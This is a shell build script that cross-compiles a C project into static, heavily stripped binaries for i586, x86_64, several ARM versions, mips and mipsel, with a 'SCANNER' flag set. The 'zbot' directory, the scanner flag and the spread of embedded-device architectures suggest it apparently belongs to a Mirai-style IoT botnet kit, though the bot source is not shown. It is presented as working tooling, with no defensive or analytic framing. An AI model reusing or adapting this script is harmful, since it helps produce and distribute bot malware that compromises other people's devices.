#!/bin/sh

compiler_dir="/home/xt/Desktop/zbot/cross-compilers/"
compiler_flags="-DSCANNER -DIPV4"

rm -rf bins
mkdir bins
gcc tor/*.c -DSCANNER -DIPV4 -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o tester
strip tester -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}i586/bin/i586-gcc tor/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/i586
${compiler_dir}i586/bin/i586-strip bins/i586 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}x86_64/bin/x86_64-gcc tor/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/x86
${compiler_dir}x86_64/bin/x86_64-strip bins/x86 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}armv7l/bin/armv7l-gcc tor/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/armv7l
${compiler_dir}armv7l/bin/armv7l-strip bins/armv7l -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}armv5l/bin/armv5l-gcc tor/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/armv5l
${compiler_dir}armv5l/bin/armv5l-strip bins/armv5l -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}armv4l/bin/armv4l-gcc tor/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/armv4l
${compiler_dir}armv4l/bin/armv4l-strip bins/armv4l -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}mips/bin/mips-gcc tor/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/mips
${compiler_dir}mips/bin/mips-strip bins/mips -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}mipsel/bin/mipsel-gcc tor/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/mipsel
${compiler_dir}mipsel/bin/mipsel-strip bins/mipsel -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
